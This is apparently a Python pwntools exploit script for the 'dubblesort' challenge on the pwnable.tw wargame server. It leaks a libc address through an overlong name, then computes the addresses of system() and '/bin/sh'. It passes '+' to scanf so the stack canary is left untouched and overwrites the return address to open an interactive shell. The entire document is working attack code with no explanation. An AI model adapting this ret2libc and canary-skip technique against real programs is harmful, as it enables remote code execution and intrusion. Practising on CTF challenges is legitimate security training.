#!/usr/bin/python

from pwn import *
from struct import unpack
from sys import stdout

def sendline(string):
    global s
    s.sendline(string)
    print string

def send(string):
	global s
	s.send(string)
	print string

def toNeg(pos): #positive -> negative
	if not hex(pos).startswith('0xf'):
		return -1
	else:
		return -((pos^0xffffffff)+1)
leng = 24
name = 'a'*leng + '\x0a'

#s = process('./dubblesort')
s = remote('chall.pwnable.tw', 10101)
raw_input('[Enter to continue]')
stdout.write(s.recvuntil(':'))
send(name)

leak = s.recvuntil(':')
print leak
leak = leak.split(',')
leak[0] = leak[0][6+leng:6+leng+4]
#print hex(int(temp, 16))
print repr(leak[0])
leak = unpack("I", leak[0])[0]

my_off_system = 0x3d200
my_off_binsh = 0x17e0cf
my_off_base_libc = 1933312
off_system = 0x3a940
off_binsh = 0x158e8b
off_base_libc = 0x1b0000
#base = leak - my_off_base_libc - 0xa
#system = base + my_off_system
#binsh = base + my_off_binsh

base = leak - off_base_libc - 0xa
system = base + off_system
binsh = base + off_binsh


print 'leak: ' + hex(leak)
print 'base_libc: ' + hex(base)




sendline('36')
stdout.write(s.recvuntil(':'))

for i in range(24):
	sendline(str(i))
	stdout.write(s.recvuntil(':'))

sendline('+')
stdout.write(s.recvuntil(':'))

for i in range(8):
	sendline(str(toNeg(system)))
	stdout.write(s.recvuntil(':'))

for i in range(3):
	sendline(str(toNeg(binsh)))
	stdout.write(s.recvuntil(':'))

s.interactive()


